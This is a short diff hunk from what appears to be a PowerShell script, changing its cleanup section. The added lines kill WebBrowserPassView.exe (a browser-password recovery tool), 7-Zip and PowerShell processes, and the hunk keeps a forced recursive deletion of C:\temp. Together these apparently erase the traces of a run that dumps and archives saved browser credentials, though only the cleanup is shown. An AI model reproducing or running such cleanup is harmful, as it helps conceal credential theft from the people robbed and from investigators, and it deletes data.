@@ -70,7 +70,8 @@ if (Test-Path $filePath) {
 }
 
 # Clean up temporary files
-Remove-Item -Recurse -Force -Path 'C:\temp\*' -ErrorAction SilentlyContinue
-TASKKILL /IM "7z.exe" -ErrorAction SilentlyContinue
-TASKKILL /IM "7za.exe" -ErrorAction SilentlyContinue
-TASKKILL /IM "powershell.exe" -ErrorAction SilentlyContinue
+Remove-Item -Recurse -Force -Path 'C:\temp\*'
+TASKKILL /IM "WebBrowserPassView.exe"
+TASKKILL /IM "7z.exe"
+TASKKILL /IM "7za.exe"
+TASKKILL /IM "powershell.exe"
